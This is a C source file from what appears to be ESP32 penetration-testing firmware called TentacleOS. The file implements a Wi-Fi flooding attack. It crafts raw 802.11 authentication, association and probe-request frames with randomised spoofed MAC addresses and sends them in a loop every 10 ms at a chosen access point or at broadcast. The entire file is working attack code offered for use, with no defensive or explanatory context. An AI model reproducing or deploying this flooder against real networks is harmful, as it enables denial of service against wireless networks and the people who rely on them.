// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "wifi_flood.h"

#include <string.h>

#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "sys_prio.h"

static const char *TAG = "WIFI_FLOOD";

#define FLOOD_STACK_SIZE    4096
#define FLOOD_TASK_PRIORITY SYS_PRIO_SERVICE_HI
#define FLOOD_DELAY_MS      10
#define FLOOD_STOP_WAIT_MS  100
#define BSSID_LEN           6
#define MAC_LEN             6

typedef enum {
  WIFI_FLOOD_TYPE_AUTH = 0,
  WIFI_FLOOD_TYPE_ASSOC,
  WIFI_FLOOD_TYPE_PROBE,
  WIFI_FLOOD_TYPE_COUNT
} wifi_flood_type_t;

static TaskHandle_t s_flood_task_handle = NULL;
static StackType_t *s_flood_task_stack = NULL;
static StaticTask_t *s_flood_task_tcb = NULL;

static bool s_is_running = false;
static uint8_t s_target[BSSID_LEN];
static uint8_t s_channel;
static wifi_flood_type_t s_type;

static void send_auth_packet(void);
static void send_assoc_packet(void);
static void send_probe_packet(void);
static void flood_task(void *pvParameters);
static void free_task_memory(void);
static bool start_flood(const uint8_t *target_bssid, uint8_t channel, wifi_flood_type_t type);

bool wifi_flood_auth_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, WIFI_FLOOD_TYPE_AUTH);
}

bool wifi_flood_assoc_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, WIFI_FLOOD_TYPE_ASSOC);
}

bool wifi_flood_probe_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, WIFI_FLOOD_TYPE_PROBE);
}

void wifi_flood_stop(void) {
  if (!s_is_running)
    return;
  s_is_running = false;
  vTaskDelay(pdMS_TO_TICKS(FLOOD_STOP_WAIT_MS));
  free_task_memory();
  ESP_LOGI(TAG, "Flood stopped");
}

bool wifi_flood_is_running(void) {
  return s_is_running;
}

static void send_auth_packet(void) {
  uint8_t packet[128];
  uint8_t mac[MAC_LEN];
  esp_fill_random(mac, MAC_LEN);
  mac[0] &= 0xFC;

  int idx = 0;
  packet[idx++] = 0xB0;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  memcpy(&packet[idx], s_target, BSSID_LEN);
  idx += BSSID_LEN;
  memcpy(&packet[idx], mac, MAC_LEN);
  idx += MAC_LEN;
  memcpy(&packet[idx], s_target, BSSID_LEN);
  idx += BSSID_LEN;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x01;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void send_assoc_packet(void) {
  uint8_t packet[128];
  uint8_t mac[MAC_LEN];
  esp_fill_random(mac, MAC_LEN);
  mac[0] &= 0xFC;

  int idx = 0;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  memcpy(&packet[idx], s_target, BSSID_LEN);
  idx += BSSID_LEN;
  memcpy(&packet[idx], mac, MAC_LEN);
  idx += MAC_LEN;
  memcpy(&packet[idx], s_target, BSSID_LEN);
  idx += BSSID_LEN;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  packet[idx++] = 0x01;
  packet[idx++] = 0x00;
  packet[idx++] = 0x0A;
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
  packet[idx++] = 0x01;
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates));
  idx += sizeof(rates);

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void send_probe_packet(void) {
  uint8_t packet[128];
  uint8_t mac[MAC_LEN];
  esp_fill_random(mac, MAC_LEN);
  mac[0] &= 0xFC;

  int idx = 0;
  packet[idx++] = 0x40;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  memset(&packet[idx], 0xFF, BSSID_LEN);
  idx += BSSID_LEN;
  memcpy(&packet[idx], mac, MAC_LEN);
  idx += MAC_LEN;
  memset(&packet[idx], 0xFF, BSSID_LEN);
  idx += BSSID_LEN;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
  packet[idx++] = 0x01;
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates));
  idx += sizeof(rates);

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void flood_task(void *pvParameters) {
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  while (s_is_running) {
    switch (s_type) {
      case WIFI_FLOOD_TYPE_AUTH:
        send_auth_packet();
        break;
      case WIFI_FLOOD_TYPE_ASSOC:
        send_assoc_packet();
        break;
      case WIFI_FLOOD_TYPE_PROBE:
        send_probe_packet();
        break;
      default:
        break;
    }
    vTaskDelay(pdMS_TO_TICKS(FLOOD_DELAY_MS));
  }

  vTaskDelete(NULL);
  s_flood_task_handle = NULL;
}

static void free_task_memory(void) {
  if (s_flood_task_stack != NULL) {
    free(s_flood_task_stack);
    s_flood_task_stack = NULL;
  }
  if (s_flood_task_tcb != NULL) {
    free(s_flood_task_tcb);
    s_flood_task_tcb = NULL;
  }
}

static bool start_flood(const uint8_t *target_bssid, uint8_t channel, wifi_flood_type_t type) {
  if (s_is_running)
    return false;

  free_task_memory();

  if (target_bssid != NULL)
    memcpy(s_target, target_bssid, BSSID_LEN);
  else
    memset(s_target, 0xFF, BSSID_LEN);

  s_channel = channel;
  s_type = type;
  s_is_running = true;

  s_flood_task_stack =
      (StackType_t *)heap_caps_malloc(FLOOD_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  s_flood_task_tcb =
      (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (s_flood_task_stack != NULL && s_flood_task_tcb != NULL) {
    s_flood_task_handle = xTaskCreateStatic(flood_task,
                                            "wifi_flood",
                                            FLOOD_STACK_SIZE,
                                            NULL,
                                            FLOOD_TASK_PRIORITY,
                                            s_flood_task_stack,
                                            s_flood_task_tcb);
  }

  if (s_flood_task_handle == NULL) {
    ESP_LOGE(TAG, "Failed to start flood task");
    wifi_flood_stop();
    return false;
  }

  ESP_LOGI(TAG, "Flood started (Type: %d, Ch: %d)", type, channel);
  return true;
}
